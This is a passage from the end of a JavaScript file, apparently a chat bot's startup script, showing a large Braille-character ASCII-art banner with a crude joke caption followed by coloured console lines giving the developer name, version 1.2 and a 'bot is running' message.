⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀                      AHHH AHHH💦
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣀⣀⣀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠁⠀⠉⠉⠛⢿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣧⡀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣿⠋⠄⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣷⣄⠀⠀⠀⠀⠹⣿⣿⣿⡿⣿⣿⣿⢼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠿⠛⠉⠉⠳⣄⠀⠀⠀⠈⢻⣿⣿⣿⣿⣳⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⣾==⠏⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⣻⣿⣿⣿⣻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠠⠔⠃⠀⠀⠉⠀⠀⠀⠀⠀⠀⠐⢶⣶⣶⢸⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣏⣾⣯⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣖⣷⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⣿⠟⠋⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⢸⣿⣇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⡀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠉⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⠛⠯⠿⠿⠿⠿⠿⢿⠀⠀⠀⠀
⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣶⣶⣦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣾⣤⣤⣤⣤⣤⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣲⣶⣶⣶⣶⣶⣶⣶⣾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
    console.log(chalk.bold.white("cimutttt yeyeye"));
    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("i'm monggghX"));
    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("1.2\n\n"));
    console.log(chalk.bold.green("Nice Bot Is Running. . ."));
})();
